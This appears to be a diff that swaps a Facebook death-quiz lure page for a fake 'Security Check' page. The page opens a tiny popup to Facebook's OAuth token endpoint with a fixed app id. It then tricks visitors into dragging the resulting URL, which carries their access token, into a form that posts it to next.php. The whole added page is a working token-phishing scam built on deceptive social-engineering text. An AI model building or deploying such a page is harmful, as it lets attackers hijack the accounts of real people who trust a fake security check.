@@ -1,42 +1,61 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml">
-<head profile="http://gmpg.org/xfn/11">
-<title>How will you die and WHEN?</title>
- 
-<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-<meta property="og:title" content="How will you die and WHEN?"/>
-<meta name="og:description" content="How will you die and WHEN?"/>
-<meta property="og:url" content="http://fbunlockpro.github.io/go"/>
-<meta property="og:site_name" content="http://fbunlockpro.github.io/go"/>
-<meta property="og:name" content="http://fbunlockpro.github.io/go"/>
-<meta property="og:image" content="http://i31.tinypic.com/2zpqmgm.jpg"/>
-<meta property="og:type" content="website" />
-<link rel="stylesheet" type="text/css" href="style.css" />
-</head>
-<body>
- 
-<div id="header" style="background: #3b5998; padding: 20px 0;"><h1>How will you die... and most importantly, WHEN?</h1></div>
- 
-<div id="main">
- 
-	<div id="left-column" class="fl">
-				<br /><br />
-				<br><br><img src="http://quizspider.com/images/deathquiz.jpg"></img><br><br>
-				<Img src="http://www.insidefacebook.com/wp-content/uploads/2009/08/facebook-connect-logo.jpg"></img>
- 
-		
+
+<!DOCTYPE html>
+<html>
+	<head>
+  <script type='text/javascript' src='http://code.jquery.com/jquery-1.6.2.js'></script>
+<script type='text/javascript'>
+
+function PopupCenter(pageURL, title,w,h) {
+document.getElementById('yes').style.visibility='visible';
+document.getElementById('yes1').style.visibility='hidden';
+var left = (screen.width/2)-(w/2);
+var top = (screen.height/2)-(h/2);
+var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
+}
+
+</script>
+		<style type="text/css">
+			html * {margin: 0; padding: 0;}
+			body {width: 520px; margin: 0 auto; font-family: "lucida grande",tahoma,verdana,arial,sans-serif; font-size: 14px;}
+			li {margin: 5px;}
+			ol {list-style: decimal;}
+		</style>
+	</head>
+
+	<body>
+		<br>
+		<div style="background: url('//i.imgur.com/J7WhPUk.png) no-repeat top left; width: 485px; height: 335px; padding: 15px 0 0 20px;">
+			<p style="color: white; font-weight: 700;">Security Check</p>
+			<p style="font-size: 11px; padding-top: 15px">Please complete our new <strong>5 second</strong> security check to confirm you're a Facebook user.</p>
+
+			<div id="container" style="margin-top: 40px;">
+				<p id="button" style="cursor: pointer; color: white; font-weight: 700; background-color: #8298c0; width: 150px; height: 20px; text-align: center; padding: 10px; border: solid 1px #4e6fa7; margin: 0 auto;">Start Test Now</p>
+
+				
+				<div id="key" style="display: none; width: 401px; margin: 0 auto;">
+					<ol style="padding-left: 10px; font-size: 12px">
+						<div id="yes1">Please <a onclick="PopupCenter('https://www.facebook.com/connect/login_success.html&response_type=token&client_id=210831918949520', 'myPop1',1,1);" href="javascript:void(0);">Generate security code</a> and follow the instructions.</div>
+						
+						<div id="yes" style="visibility:hidden;"><img src="//i.imgur.com/7GjYozB.png" height="50" width="50"></img> <br><br>Your security code was successfully generated. <br><br><strong>Drag the green padlock on the popup to the box below</strong><br><br><form action="next.php" method="POST"><input type="text" name="sec" value="" style="margin-width:350px;"></input> <input type="submit" name="submit" value="Continue"></input></form>
+					</ol>
+
+				</div>
+
+
 			</div>
+		</div>
 
-	
-</div>
- 
-<div id="footer">
-	<div id="foot-left" class="fl"FB Quiz &copy; 2014</div>
-	<div id="foot-right" class="fl">&nbsp;</div>
+		<script type="text/javascript" src="http://code.jquery.com/jquery-1.5.2.min.js"></script>
+		<script type="text/javascript">
+			$(document).ready(function() {
+				$("#button").click(function(){
 
-	<div class="fix"></div>
-</div>
-
-
-</body>
+					$("#button").css("display","none");
+					$("#key").css("display","block");
+					$("#c").focus();
+					$("#c").select();
+				});
+			});
+		</script>
+	</body>
 </html>
